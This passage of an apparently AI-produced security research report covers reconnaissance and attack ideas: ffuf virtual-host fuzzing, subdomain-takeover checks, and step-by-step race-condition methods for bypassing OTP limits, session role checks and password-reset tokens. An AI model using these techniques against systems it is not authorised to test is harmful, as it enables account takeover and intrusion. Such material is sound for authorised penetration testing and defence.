- **Practical steps**: (1) Use `ffuf` for vhost enumeration: `ffuf -u https://target.com -H "Host: FUZZ.target.com" -w /path/to/subdomains.txt -fs <default-size>`. (2) Check for subdomain takeover: look for CNAME records pointing to decommissioned services (S3 buckets, Heroku, Azure, GitHub Pages). (3) Use certificate transparency logs (crt.sh) to find all issued certificates for the domain. (4) Test each discovered subdomain/vhost for the same vulnerabilities, as they may run different software or configurations. (5) Check for internal vhosts that respond only to specific Host headers (e.g., `admin.target.internal`, `api-internal.target.com`).

### Gaps
- This topic was not deeply searched due to tool-call limits. A dedicated search would yield more specific techniques.

---

## Race Condition Exploitation for Authentication Bypass

### Takeaway
Race conditions in authentication flows (particularly OTP validation, session creation, and privilege checks) are an underexplored area that can bypass even strong authentication mechanisms.

### Cited Findings
- PortSwigger defines authentication race conditions where carefully timed requests during login, session creation, or token validation can bypass security checks. -- [PortSwigger Academy](https://portswigger.net/web-security/race-conditions)
- The QUICker tool (2025) is the first race condition exploitation tool for HTTP/3, enabling exploitation of race windows previously too narrow to target. -- [ScienceDirect](https://www.sciencedirect.com/science/article/pii/S0167404825004298)

### Inferences
- **OTP bypass via race condition**: (1) Request an OTP. (2) Send 50+ simultaneous requests trying different OTP values, each in a separate HTTP/2 stream within a single TCP connection. (3) If the server checks the OTP and increments the attempt counter in separate database operations, some requests may validate before the rate limit kicks in.
- **Session fixation via race**: If the application creates a session and assigns a role in separate operations, sending requests during the gap may allow accessing elevated functionality with a partially-initialized session.
- **Password reset race**: Send multiple simultaneous password reset requests. If the application generates a token, stores it, and sends it in separate steps, multiple valid tokens may be generated, or a token may be sent before the old one is invalidated.

### Gaps
- No specific OTP race condition CVE was found for CodeIgniter or PHP-FPM.
